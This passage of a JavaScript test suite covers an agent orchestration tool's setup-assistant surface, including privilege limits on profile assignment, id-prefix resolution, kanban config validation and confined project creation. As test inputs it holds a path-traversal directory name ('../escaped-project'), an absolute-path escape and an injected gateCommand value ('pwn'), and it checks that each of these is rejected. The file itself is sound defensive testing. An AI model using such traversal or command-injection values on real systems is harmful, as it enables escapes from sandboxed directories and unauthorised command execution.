  const paBefore = db.getAgent(agent.id)?.profileId ?? null;
  const paElev = await call("profile_assign", { agentId: agent.id, profileId: "elevatedRig" });
  check("(g) profile_assign REJECTS assigning an elevated-role (platform) profile", typeof paElev.error === "string" && /platform|elevat|cannot/i.test(paElev.error));
  check("(g) profile_assign: the rejected elevate left the agent's assignment UNCHANGED", (db.getAgent(agent.id)?.profileId ?? null) === paBefore);
  const paOk = await call("profile_assign", { agentId: agent.id, profileId: prof.id });
  check("(g) profile_assign: an allowed-role (worker) profile still assigns fine", paOk.profileId === prof.id && !paOk.error);

  // ============ (g2) agent_update / profile_assign resolve an id-PREFIX like agent_get does ============
  // The bug: agent_get resolves an 8-char id-PREFIX, but the agent WRITE handlers (agent_update,
  // profile_assign) did EXACT-match only — a prefix that read fine 404'd on write. CRAFTED UUID-shaped
  // ids: one with a UNIQUE 8-char prefix, two that SHARE an 8-char prefix (the ambiguity fixture).
  const ID_PFX_SOLO = "9a8b7c6d-0000-4000-8000-000000000001"; // unique prefix "9a8b7c6d"
  const ID_PFX_DUP_A = "d0d0d0d0-0000-4000-8000-00000000000a"; // shares prefix "d0d0d0d0" with…
  const ID_PFX_DUP_B = "d0d0d0d0-0000-4000-8000-00000000000b"; // …this one
  db.insertAgent({ id: ID_PFX_SOLO, projectId: created.id, name: "PfxSolo", startupPrompt: "PFX SOLO", position: 10, profileId: null });
  db.insertAgent({ id: ID_PFX_DUP_A, projectId: created.id, name: "PfxAlpha", startupPrompt: "A", position: 11, profileId: null });
  db.insertAgent({ id: ID_PFX_DUP_B, projectId: created.id, name: "PfxBravo", startupPrompt: "B", position: 12, profileId: null });

  const auUnambig = await call("agent_update", { agentId: "9a8b7c6d", name: "Renamed via prefix" });
  check("(g2) agent_update: resolves an UNAMBIGUOUS 8-char id-prefix", auUnambig.id === ID_PFX_SOLO && auUnambig.name === "Renamed via prefix" && !auUnambig.error);
  const auExact = await call("agent_update", { agentId: ID_PFX_SOLO, name: "Renamed via full id" });
  check("(g2) agent_update: a full id still works (regression)", auExact.id === ID_PFX_SOLO && auExact.name === "Renamed via full id" && !auExact.error);
  const auAmbig = await call("agent_update", { agentId: "d0d0d0d0", name: "should not apply" });
  check("(g2) agent_update: an AMBIGUOUS prefix is REJECTED, naming BOTH candidate ids",
    typeof auAmbig.error === "string" && auAmbig.error.includes("ambiguous") && auAmbig.error.includes(ID_PFX_DUP_A) && auAmbig.error.includes(ID_PFX_DUP_B));
  check("(g2) agent_update: the ambiguous call never picked a match (both names unchanged)",
    db.getAgent(ID_PFX_DUP_A)?.name === "PfxAlpha" && db.getAgent(ID_PFX_DUP_B)?.name === "PfxBravo");

  const paUnambig = await call("profile_assign", { agentId: "9a8b7c6d", profileId: prof.id });
  check("(g2) profile_assign: resolves an UNAMBIGUOUS 8-char id-prefix", paUnambig.id === ID_PFX_SOLO && paUnambig.profileId === prof.id && !paUnambig.error);
  const paExact = await call("profile_assign", { agentId: ID_PFX_SOLO, profileId: prof.id });
  check("(g2) profile_assign: a full id still works (regression)", paExact.id === ID_PFX_SOLO && paExact.profileId === prof.id && !paExact.error);
  const paAmbig = await call("profile_assign", { agentId: "d0d0d0d0", profileId: prof.id });
  check("(g2) profile_assign: an AMBIGUOUS prefix is REJECTED, naming BOTH candidate ids",
    typeof paAmbig.error === "string" && paAmbig.error.includes("ambiguous") && paAmbig.error.includes(ID_PFX_DUP_A) && paAmbig.error.includes(ID_PFX_DUP_B));
  check("(g2) profile_assign: the ambiguous call assigned NOTHING to either candidate",
    db.getAgent(ID_PFX_DUP_A)?.profileId == null && db.getAgent(ID_PFX_DUP_B)?.profileId == null);

  // ============ (h) single-record READ tools — stop reading via empty-payload mutators ============
  const gotAgent = await call("agent_get", { agentId: agent.id });
  check("(h) agent_get: returns the FULL agent record incl. startupPrompt",
    gotAgent.id === agent.id && gotAgent.startupPrompt === "AMENDED prompt v2" && !gotAgent.error);
  check("(h) agent_get: unknown id → not-found error", typeof (await call("agent_get", { agentId: "nope" })).error === "string");
  const gotProfile = await call("profile_get", { profileId: prof.id });
  check("(h) profile_get: returns the FULL profile record (role)", gotProfile.id === prof.id && gotProfile.role === "worker" && !gotProfile.error);
  check("(h) profile_get: unknown id → not-found error", typeof (await call("profile_get", { profileId: "nope" })).error === "string");
  const gotProject = await call("project_get", { projectId: created.id });
  check("(h) project_get: returns the FULL project record incl. config", gotProject.id === created.id && !!gotProject.config && !gotProject.error);
  check("(h) project_get: unknown id → not-found error", typeof (await call("project_get", { projectId: "nope" })).error === "string");

  // ============ (i) the BOARD-RENAME the operator failed at now SUCCEEDS via the setup AGENT validator ====
  // The motivating bug: the operator told the user kanbanColumns config was "not implemented." Prove a
  // kanbanColumns PATCH is ACCEPTED by the setup surface's AGENT validator, and an invalid config's
  // rejection now names the valid top-level keys (so a future fat-finger converges).
  const renameCols = await call("project_configure", {
    projectId: created.id,
    config: { kanbanColumns: [{ key: "todo", label: "To Do", role: "defaultLanding" }, { key: "doing", label: "Doing" }, { key: "done", label: "Done", role: "terminal" }] },
  });
  check("(i) project_configure: a kanbanColumns layout is ACCEPTED by the setup AGENT validator", renameCols.ok === true && !renameCols.error);
  check("(i) project_configure: the renamed columns are stored (resolveConfig reflects 3 columns)",
    resolveConfig(db.getProject(created.id).config).kanbanColumns.length === 3
    && resolveConfig(db.getProject(created.id).config).kanbanColumns[0].label === "To Do");
  // An invalid config (the wrong "columns" key) is rejected AND lists the valid keys to aid discovery.
  const wrongKey = await call("project_configure", { projectId: created.id, config: { columns: [{ key: "x", label: "X" }] } });
  check("(i) project_configure: the wrong 'columns' key is rejected", typeof wrongKey.error === "string" && !wrongKey.ok);
  check("(i) project_configure: the rejection lists valid top-level keys incl. kanbanColumns",
    Array.isArray(wrongKey.validTopLevelKeys) && wrongKey.validTopLevelKeys.includes("kanbanColumns") && wrongKey.validTopLevelKeys.includes("permission"));

  // ============ (j) project_init — bootstrap a NEW project under the SANCTIONED base (no-repo onboarding) ===
  // The headline gap: a fresh user with NO git repo can now be onboarded end-to-end. project_init creates a
  // brand-new dir STRICTLY under WORKSPACE_ROOT (inside LOOM_HOME) and git-inits it — the operator's ONLY
  // host-write, fail-closed (name-derived path, confined, traversal rejected). LOOM_HOME = tmpHome here.
  const wsRootNorm = path.resolve(WORKSPACE_ROOT);
  check("(j) precondition: WORKSPACE_ROOT is under the hermetic LOOM_HOME", wsRootNorm.startsWith(path.resolve(tmpHome)));

  // kind "git" (default) → creates a dir under the sanctioned base + `git init` (isGitRepo would accept it).
  const initGit = await call("project_init", { name: "Fresh Code" });
  check("(j) project_init(git): returns a project with an id", !!initGit.id && !initGit.error);
  check("(j) project_init(git): repoPath is CONFINED strictly under WORKSPACE_ROOT",
    path.resolve(initGit.repoPath).startsWith(wsRootNorm + path.sep) && path.resolve(initGit.repoPath) !== wsRootNorm);
  check("(j) project_init(git): vaultPath binds to the same created dir", initGit.vaultPath === initGit.repoPath);
  check("(j) project_init(git): the dir exists and was `git init`ed (.git present)",
    fs.existsSync(initGit.repoPath) && fs.existsSync(path.join(initGit.repoPath, ".git")));
  check("(j) project_init(git): persisted as a NON-reserved project", db.getProject(initGit.id)?.reserved === false);
  check("(j) project_init(git): the created repo passes a real isGitRepo check", await isGitRepoReal(initGit.repoPath));

  // kind "vault" → creates a plain notes folder (NO git init) for a research/notes user.
  const initVault = await call("project_init", { name: "My Notes", kind: "vault" });
  check("(j) project_init(vault): returns a project confined under WORKSPACE_ROOT",
    !!initVault.id && path.resolve(initVault.repoPath).startsWith(wsRootNorm + path.sep) && !initVault.error);
  check("(j) project_init(vault): the dir exists but is NOT a git repo (no .git)",
    fs.existsSync(initVault.repoPath) && !fs.existsSync(path.join(initVault.repoPath, ".git")));

  // An explicit dirName is honored (and still confined).
  const initNamed = await call("project_init", { name: "Anything", kind: "vault", dirName: "explicit-dir" });
  check("(j) project_init: an explicit dirName lands under the sanctioned base as that leaf",
    path.basename(initNamed.repoPath) === "explicit-dir" && path.resolve(initNamed.repoPath) === path.join(wsRootNorm, "explicit-dir"));

  // NEGATIVE / TRAVERSAL CONTROL (load-bearing): a dirName that tries to escape the base is REJECTED and
  // creates NOTHING — neither a project row nor any dir outside the sanctioned base.
  const nBeforeTraversal = db.listAllProjects().length;
  const escapeTarget = path.join(path.resolve(tmpHome), "escaped-project");
  const traversalInit = await call("project_init", { name: "Evil", dirName: "../escaped-project" });
  check("(j) project_init: a traversal dirName ('../…') is REJECTED", typeof traversalInit.error === "string" && !traversalInit.id);
  check("(j) project_init: the rejected traversal created NO project row", db.listAllProjects().length === nBeforeTraversal);
  check("(j) project_init: the rejected traversal wrote NOTHING outside the sanctioned base", !fs.existsSync(escapeTarget));
  // An absolute dirName is rejected the same way.
  const absInit = await call("project_init", { name: "Evil2", dirName: path.join(path.resolve(tmpHome), "abs-escape") });
  check("(j) project_init: an absolute dirName is REJECTED", typeof absInit.error === "string" && !absInit.id);
  // Refuse to clobber: re-initing the SAME name (→ same slug) fails (the dir already exists), nothing created.
  const nBeforeDup = db.listAllProjects().length;
  const dup = await call("project_init", { name: "Fresh Code" });
  check("(j) project_init: refuses to clobber an existing dir (same name → same slug)", typeof dup.error === "string" && !dup.id);
  check("(j) project_init: the refused clobber created NO project", db.listAllProjects().length === nBeforeDup);
  // project_init still routes config through the AGENT validator (gateCommand rejected).
  const initGate = await call("project_init", { name: "RceInit", config: { orchestration: { gateCommand: "pwn" } } });
  check("(j) project_init REJECTS orchestration.gateCommand (AGENT validator)", typeof initGate.error === "string" && !initGate.id);

  // ============ (k) project_create VAULT-ONLY — bind an EXISTING non-git notes folder (repoPath omitted) ===
  // A research/notes user whose vault is NOT a git repo can be set up: omit repoPath, give an existing dir as
  // vaultPath. `nonGit` is a real existing (non-git) dir from the fixtures above.
  const vaultOnly = await call("project_create", { name: "Research Vault", vaultPath: nonGit });
  check("(k) project_create(vault-only): a non-git existing vaultPath is ACCEPTED", !!vaultOnly.id && !vaultOnly.error);
  check("(k) project_create(vault-only): both repoPath and vaultPath bind to the notes folder",
    vaultOnly.repoPath === nonGit && vaultOnly.vaultPath === nonGit);
  check("(k) project_create(vault-only): persisted as a non-reserved project", db.getProject(vaultOnly.id)?.reserved === false);
  // A vault-only create with NO vaultPath (and no repoPath) is rejected — nothing to bind.
  const noTarget = await call("project_create", { name: "Nothing" });
  check("(k) project_create: omitting BOTH repoPath and vaultPath is rejected", typeof noTarget.error === "string" && !noTarget.id);
  // A vaultPath that doesn't exist is rejected (fail-closed — don't bind a phantom folder).
  const missingVault = await call("project_create", { name: "Ghost", vaultPath: path.join(path.resolve(tmpHome), "does-not-exist") });
  check("(k) project_create: a non-existent vaultPath is rejected", typeof missingVault.error === "string" && !missingVault.id);

  // ============ (l) template_list / template_apply (onboarding C2) ============
  // template_list: read-only catalog — the two canonical presets, each with a roster summary.
  const templates = await call("template_list", {});
  check("(l) template_list: returns both canonical templates", Array.isArray(templates) && templates.length === 2);
  const soloListed = templates.find((t) => t.name === "Solo builder");
  check("(l) template_list: 'Solo builder' has a description + a roster summary (name+profileName, no startupPrompt)",
    !!soloListed && typeof soloListed.description === "string"
    && soloListed.agents.length === 3
    && soloListed.agents.every((a) => typeof a.name === "string" && typeof a.profileName === "string" && a.startupPrompt === undefined));

  // template_apply: applied to `created` (a real project from (c)) — stands up the roster + starter cards
  // via the ordinary agent_create/task-insert path, reflected on the ordinary reads.
  const nAgentsBefore = db.listAgents(created.id).length;
  const nTasksBefore = db.listTasks(created.id).length;
  const applied = await call("template_apply", { projectId: created.id, templateName: "Solo builder" });
  check("(l) template_apply: stands up one agent per templated agent", !applied.error && applied.agents.length === 3);
  check("(l) template_apply: seeds the starter board card(s)", applied.tasks.length === 1);
  check("(l) template_apply: the new agents are visible via the ordinary listAgents read",
    db.listAgents(created.id).length === nAgentsBefore + 3);
  check("(l) template_apply: the new tasks are visible via the ordinary listTasks read",
    db.listTasks(created.id).length === nTasksBefore + 1);
  check("(l) template_apply: every applied agent is bound to an EXISTING profile (never minted) and passes setupRoleError",
    applied.agents.every((a) => a.profileId != null && db.getProfile(a.profileId) != null));

  // Fail-closed: an unknown templateName is rejected, nothing written.
  const nAgentsBeforeUnknown = db.listAgents(created.id).length;
  const unknownTemplate = await call("template_apply", { projectId: created.id, templateName: "Nope, not a real template" });
  check("(l) template_apply: an unknown templateName is rejected", typeof unknownTemplate.error === "string" && !unknownTemplate.agents);
  check("(l) template_apply: the rejected unknown-template apply wrote NO agents", db.listAgents(created.id).length === nAgentsBeforeUnknown);

  // Fail-closed / project-scope guard: an unknown projectId is rejected the SAME way project_configure/
  // agent_create reject one (db.getProject lookup → 404), never widening the operator's reach.
  const unknownProject = await call("template_apply", { projectId: "not-a-real-project-id", templateName: "Solo builder" });
  check("(l) template_apply: an unknown projectId is rejected (project-scope guard)",
    unknownProject.error === "project not found");

  await client.close();
} finally {
  db.close();
  try { fs.rmSync(tmpHome, { recursive: true, force: true }); } catch { /* best-effort */ }
  try { fs.rmSync(repo, { recursive: true, force: true }); } catch { /* best-effort */ }
  try { fs.rmSync(nonGit, { recursive: true, force: true }); } catch { /* best-effort */ }
  try { fs.rmSync(freshVault, { recursive: true, force: true }); } catch { /* best-effort */ }
}

console.log(failures === 0
  ? "\n✅ ALL PASS — the Setup Assistant surface is the curated, fail-closed subset of 22 (project_create (incl. VAULT-ONLY)/project_init (sanctioned-base bootstrap, traversal-rejected)/configure/update + agent_create + agent_update (least-privilege, no elevated-rig assignment) + agent_get/profile_get/project_get reads + project_archive (soft, reserved-guarded) + manager|plain spawn + list_all_* + skill_list/skill_write + template_list/template_apply (onboarding C2, project-scope guarded)), project_init confines to WORKSPACE_ROOT and refuses traversal/escape/clobber, a setup session 404s on /mcp-platform, /mcp-orch AND /mcp-audit, a non-setup session can never reach /mcp-setup, every config path rejects gateCommand/alertWebhook, session_spawn refuses platform/auditor/worker/setup, a kanbanColumns layout is accepted by the AGENT validator, and skill_write is confirm-first + bounded to the USER store (never the bundled/dev set) — claude-free, network-free."
  : `\n❌ ${failures} FAILURE(S).`);
process.exit(failures === 0 ? 0 : 1);
